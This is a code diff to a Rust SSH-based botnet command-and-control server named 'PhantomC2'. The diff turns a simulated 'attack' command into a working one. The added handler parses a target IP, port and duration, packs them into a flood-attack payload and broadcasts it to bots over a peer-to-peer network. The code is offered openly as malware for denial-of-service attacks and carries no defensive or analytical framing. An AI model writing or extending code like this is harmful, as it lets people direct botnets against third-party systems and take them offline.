@@ -4,6 +4,7 @@ use async_trait::async_trait;
 use russh::{server, Channel, ChannelId, CryptoVec};
 use russh_keys::key;
 use log::{info, error};
+use crate::p2p::P2PService;
 
 // Shared State for the C2
 pub struct ServerState {
@@ -14,13 +15,15 @@ pub struct ServerState {
 pub struct PhantomServer {
     pub state: Arc<Mutex<ServerState>>,
     pub master_key: Arc<ed25519_dalek::SigningKey>,
+    pub p2p_service: Arc<P2PService>,
 }
 
 impl PhantomServer {
-    pub fn new(master_key: Arc<ed25519_dalek::SigningKey>) -> Self {
+    pub fn new(master_key: Arc<ed25519_dalek::SigningKey>, p2p_service: Arc<P2PService>) -> Self {
         Self {
             state: Arc::new(Mutex::new(ServerState { clients: HashMap::new() })),
             master_key,
+            p2p_service,
         }
     }
 }
@@ -28,6 +31,7 @@ impl PhantomServer {
 pub struct PhantomSession {
     pub state: Arc<Mutex<ServerState>>,
     pub master_key: Arc<ed25519_dalek::SigningKey>,
+    pub p2p_service: Arc<P2PService>,
 }
 
 #[async_trait]
@@ -89,8 +93,27 @@ impl server::Handler for PhantomSession {
              if cmd == "help" {
                   session.data(channel, CryptoVec::from_slice(b"Available: attack <ip> <port> <duration>\r\n"));
              } else if cmd.starts_with("attack ") {
-                  session.data(channel, CryptoVec::from_slice(b"[+] Attack Injected (Simulation)\r\n"));
-                  info!("Injected Attack via SSH Command");
+                  // Parse: attack 1.2.3.4 80 60
+                  let parts: Vec<&str> = cmd.split_whitespace().collect();
+                  if parts.len() >= 4 {
+                      let target_ip: std::net::Ipv4Addr = parts[1].parse().unwrap_or(std::net::Ipv4Addr::new(0,0,0,0));
+                      let port: u16 = parts[2].parse().unwrap_or(0);
+                      let duration: u32 = parts[3].parse().unwrap_or(0);
+                      
+                      // Construct Payload: [Type(1)] [IP(4)] [Port(2)] [Duration(4)]
+                      let mut payload = Vec::new();
+                      payload.push(1); // Attack Type 1 (Generic UDP/Syn?)
+                      payload.extend_from_slice(&u32::from(target_ip).to_be_bytes()); // Network Order
+                      payload.extend_from_slice(&port.to_be_bytes());
+                      payload.extend_from_slice(&duration.to_be_bytes());
+                      
+                      self.p2p_service.broadcast_command(payload).await;
+                      
+                      session.data(channel, CryptoVec::from_slice(b"[+] Global Attack Broadcasted!\r\n"));
+                      info!("Broadcasting Attack on {}", target_ip);
+                  } else {
+                      session.data(channel, CryptoVec::from_slice(b"Usage: attack <ip> <port> <duration>\r\n"));
+                  }
              }
              
              session.data(channel, CryptoVec::from_slice(b"PhantomC2$ "));
